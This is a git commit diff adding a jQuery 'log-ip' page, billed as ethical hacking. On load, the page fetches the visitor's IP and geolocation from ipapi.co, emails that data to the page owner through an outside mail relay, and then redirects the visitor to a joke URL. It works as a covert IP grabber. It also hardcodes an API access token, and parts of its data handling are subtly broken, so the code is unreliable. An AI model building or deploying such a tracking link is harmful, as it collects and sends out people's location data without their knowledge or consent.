5969e0db49bae830ec9ff4c11c837cf0358fe9d3
nitinjs <nitin.jaysing@gmail.com>
2023-01-20 11:22:57 +0530

    3 files modified, 1 deleted

--- README.md
+++ README.md
@@ -1,3 +1,13 @@
 # log-ip
 
+Steps:
+<ol>
+  <li>jQuery plugin to send GET IP of the user using [ipapi.co](https://ipapi.co/json/)</li>
+  <li>Get API key from [PostMail](https://postmail.invotes.com/)</li>
+  <li>Send email from javascript</li>
+  <li>No fourth step</li>
+</ol>
+
+[Detailed article](http://blog.nitinsawant.com/2023/01/ethical-hacking-hassle-free-logging-ip.html)
+
 [Edit on StackBlitz ⚡️](https://stackblitz.com/edit/web-platform-jviqq7)
--- script.js
+++ script.js
@@ -1,1 +1,35 @@
-console.log('Hello!');
+var data = {
+  access_token: 'zlp84wtqc5op1n9bnfqe7gf5',
+};
+
+jQuery.getCORS = function (source, func) {
+  var xmlHttpRequestObject;
+  if (window.XMLHttpRequest) {
+    xmlHttpRequestObject = new XMLHttpRequest();
+    if (xmlHttpRequestObject != null) {
+      var sUrl = source;
+      xmlHttpRequestObject.open('GET', sUrl, true);
+      xmlHttpRequestObject.onreadystatechange = function () {
+        func(xmlHttpRequestObject.responseText);
+      };
+      xmlHttpRequestObject.send();
+    } else {
+      func('Error creating XmlHttpRequest object. Client is not CORS enabled');
+    }
+  }
+};
+
+$(document).ready(function () {
+  $.getCORS('https://ipapi.co/json/', function (data) {
+    data['subject'] = 'IP logged';
+    data['text'] = data;
+
+    $.post('https://postmail.invotes.com/send', data, function () {
+      //success
+      window.location = 'https://letmegooglethat.com/?q=EarnMoney';
+    }).fail(function () {
+      //error
+      window.location = 'https://letmegooglethat.com/?q=EarnMoney';
+    });
+  });
+});
